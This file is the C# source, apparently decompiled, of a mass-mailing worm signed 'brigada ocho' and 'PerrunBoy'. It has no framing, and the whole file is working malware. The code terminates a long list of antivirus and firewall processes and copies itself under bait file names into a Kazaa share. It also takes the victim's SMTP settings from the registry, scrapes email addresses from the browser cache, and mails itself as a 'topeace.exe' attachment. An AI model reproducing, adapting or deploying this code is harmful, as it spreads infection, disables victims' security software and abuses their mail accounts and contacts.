using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Reflection;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace alcopaul;

public class brigadaochodotnet
{
	public static void Main(string[] args)
	{
		//IL_026b: Unknown result type (might be due to invalid IL or missing references)
		string text = "zonealarm,wfindv32,vb6,webscanx,vsstat,vshwin32,vsecomr,vscan40,vettray,vet95,tds2-nt,tds2-98,tca,tbscan,sweep95,sphinx,smc,serv95,scrscan,scanpm,scan95,scan32,safeweb,rescue,rav7win,rav7,persfw,pcfwallicon,pccwin98,pavw,pavsched,pavcl,padmin,outpost,nvc95,nupgrade,normist,nmain,nisum,navwnt,navw32,navnt,navlu32,navapw32,n32scanw,mpftray,moolive,luall,lookout,lockdown2000,jedi,iomon98,iface,icsuppnt,icsupp95,icmon,icloadnt,icload95,ibmavsp,ibmasn,iamserv,iamapp,frw,fprot,fp-win,findviru,f-stopw,f-prot95,f-prot,f-agnt95,espwatch,esafe,ecengine";
		string text2 = "dvp95_0,dvp95,cleaner3,cleaner,claw95cf,claw95,cfinet32,cfinet,cfiaudit,cfiadmin,blackice,blackd,avwupd32,avwin95,avsched32,avpupd,avptc32,avpm,avpdos32,avpcc,avp32,avp,avnt,avkserv,avgctrl,ave32,avconsol,autodown,apvxdwin,anti-trojan,ackwin32,_avpm,_avpcc,_avp32";
		string[] array = text.Split(new char[1] { ',' });
		string[] array2 = text2.Split(new char[1] { ',' });
		string[] array3 = array;
		foreach (string ave in array3)
		{
			killprocs(ave);
		}
		array3 = array2;
		foreach (string ave2 in array3)
		{
			killprocs(ave2);
		}
		Module module = Assembly.GetExecutingAssembly().GetModules()[0];
		string tach = uue(module.FullyQualifiedName);
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Kazaa\\LocalContent", writable: true);
		registryKey.SetValue("Dir0", "012345:" + Directory.GetCurrentDirectory());
		string[] array4 = new string[11]
		{
			"shakira.exe", "avril_lavigne.exe", "Visual_Studio.NET2003_key.exe", "teach_yourself_c#_in_1_week.exe", "scan.net.exe", "hitman2fulldownloader.exe", "Tekken4_full_downloader.exe", "teach_yourself_COBOL.NET_in_21_days.exe", "how_to_get_chicks_on_your_bed.exe", "brigadaocho.net.exe",
			"drunken_pope_pics.exe"
		};
		array3 = array4;
		foreach (string destFileName in array3)
		{
			try
			{
				File.Copy(module.FullyQualifiedName, destFileName);
			}
			catch
			{
			}
		}
		RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Internet Account Manager", writable: true);
		RegistryKey registryKey3 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Internet Account Manager\\Accounts\\" + registryKey2.GetValue("Default Mail Account")!.ToString(), writable: true);
		string mserv = registryKey3.GetValue("SMTP Server")!.ToString();
		string fm = registryKey3.GetValue("SMTP Email Address")!.ToString();
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.InternetCache);
		string[] directories = Directory.GetDirectories(folderPath);
		array3 = directories;
		foreach (string path in array3)
		{
			string[] directories2 = Directory.GetDirectories(path);
			string[] array5 = directories2;
			foreach (string path2 in array5)
			{
				string[] files = Directory.GetFiles(path2, "*.ht*");
				string[] array6 = files;
				foreach (string phile in array6)
				{
					extractmails(phile, mserv, fm, tach);
				}
			}
		}
		MessageBox.Show("brigada ocho ::: \"bringing the c# technology to the masses\"", "msil.mass by PerrunBoy ::: http://vx.netlux.org/~b8", (MessageBoxButtons)0, (MessageBoxIcon)48);
	}

	public static void extractmails(string phile, string mserv, string fm, string tach)
	{
		FileStream stream = new FileStream(phile, FileMode.OpenOrCreate, FileAccess.Read);
		StreamReader streamReader = new StreamReader(stream);
		streamReader.BaseStream.Seek(0L, SeekOrigin.Begin);
		while (streamReader.Peek() > -1)
		{
			string datum = streamReader.ReadLine();
			string text = xtrak(datum);
			if (text != "")
			{
				castaway(mserv, fm, text, tach);
			}
		}
		streamReader.Close();
	}

	public static string xtrak(string datum)
	{
		char[] anyOf = new char[6] { '?', '\'', '"', '>', '<', ' ' };
		checked
		{
			try
			{
				int num = datum.IndexOf("mailto:");
				int num2 = datum.LastIndexOfAny(anyOf);
				char[] array = new char[(uint)unchecked(num2 - num)];
				datum.CopyTo(num, array, 0, unchecked(num2 - num));
				string text = new string(array);
				string text2 = text.Replace("mailto:", "");
				string text3 = text2.Replace("%20", "");
				string text4 = text3.Replace("%40", "@");
				try
				{
					int num3 = text4.IndexOfAny(anyOf);
					char[] array2 = new char[(uint)num3];
					text4.CopyTo(0, array2, 0, num3);
					return new string(array2);
				}
				catch
				{
					return text4;
				}
			}
			catch
			{
				return "";
			}
		}
	}

	public static string uue(string attch)
	{
		FileStream fileStream = new FileStream(attch, FileMode.OpenOrCreate, FileAccess.Read);
		BinaryReader binaryReader = new BinaryReader(fileStream);
		binaryReader.BaseStream.Seek(0L, SeekOrigin.Begin);
		byte[] array = new byte[checked((uint)fileStream.Length)];
		int num = (int)fileStream.Length;
		int num2 = 0;
		while (num > 0)
		{
			int num3 = binaryReader.Read(array, num2, num);
			if (num3 == 0)
			{
				break;
			}
			num2 += num3;
			num -= num3;
		}
		binaryReader.Close();
		StringBuilder stringBuilder = new StringBuilder();
		string text = Convert.ToBase64String(array);
		int length = text.Length;
		char[] array2 = new char[checked((uint)length)];
		text.CopyTo(0, array2, 0, length);
		for (int i = 1; i <= length; i++)
		{
			if (i % 76 == 0)
			{
				stringBuilder.Append($"{array2[i - 1]}\r\n");
			}
			else
			{
				stringBuilder.Append($"{array2[i - 1]}");
			}
		}
		return stringBuilder.ToString();
	}

	public static void killprocs(string ave)
	{
		Process[] processesByName = Process.GetProcessesByName(ave);
		Process[] array = processesByName;
		foreach (Process process in array)
		{
			process.Kill();
		}
	}

	public static void castaway(string serv, string from, string to, string attch)
	{
		string text = "From: " + from + " <" + from + ">\r\n";
		string text2 = "To: " + to + " <" + to + ">\r\n";
		string text3 = "Date: " + DateTime.Now.ToString() + "\r\n";
		string text4 = "X-Mailer: dotNETSMTPengine\r\n";
		string text5 = "X-Priority: 3\r\n";
		string text6 = "MIME-Version: 1.0\r\n";
		string text7 = "Content-Type: multipart/mixed; boundary=\"----=rerty\";\r\n\r\n";
		string text8 = "This is a multi-part message in MIME format.\r\n\r\n";
		string text9 = "------=rerty\r\n";
		string text10 = "Content-Type: text/html; charset=us-ascii\r\n\r\n";
		string text11 = "\"all we are saying, is give peace a chance. no to war and terrorism.\"\r\n\r\n";
		string text12 = "------=rerty\r\n";
		string text13 = "Content-Type: application/x-msdownload; name=\"topeace.exe\"\r\n";
		string text14 = "Content-Transfer-Encoding: base64\r\n";
		string text15 = "Content-Disposition: attachment; ";
		string text16 = "filename=\"topeace.exe\"\r\n\r\n";
		string text17 = "\r\n\r\n";
		string text18 = "------=rerty--\r\n\r\n.\r\n";
		TcpClient tcpClient = new TcpClient(serv, 25);
		NetworkStream stream = tcpClient.GetStream();
		StreamReader streamReader = new StreamReader(tcpClient.GetStream());
		streamReader.ReadLine();
		string s = "HELO localhost\r\n";
		byte[] bytes = Encoding.ASCII.GetBytes(s);
		stream.Write(bytes, 0, bytes.Length);
		streamReader.ReadLine();
		s = "MAIL FROM: <" + from + ">\r\n";
		bytes = Encoding.ASCII.GetBytes(s);
		stream.Write(bytes, 0, bytes.Length);
		streamReader.ReadLine();
		s = "RCPT TO: <" + to + ">\r\n";
		bytes = Encoding.ASCII.GetBytes(s);
		stream.Write(bytes, 0, bytes.Length);
		streamReader.ReadLine();
		s = "DATA\r\n";
		bytes = Encoding.ASCII.GetBytes(s);
		stream.Write(bytes, 0, bytes.Length);
		streamReader.ReadLine();
		string s2 = text + text2 + text3 + text4 + text5;
		bytes = Encoding.ASCII.GetBytes(s2);
		stream.Write(bytes, 0, bytes.Length);
		string s3 = text6 + text7 + text8 + text9 + text10 + text11;
		bytes = Encoding.ASCII.GetBytes(s3);
		stream.Write(bytes, 0, bytes.Length);
		string s4 = text12 + text13 + text14 + text15 + text16 + attch + text17 + text18;
		bytes = Encoding.ASCII.GetBytes(s4);
		stream.Write(bytes, 0, bytes.Length);
		streamReader.ReadLine();
		s = "QUIT\r\n";
		bytes = Encoding.ASCII.GetBytes(s);
		stream.Write(bytes, 0, bytes.Length);
		streamReader.ReadLine();
		stream.Close();
		streamReader.Close();
		tcpClient.Close();
	}
}
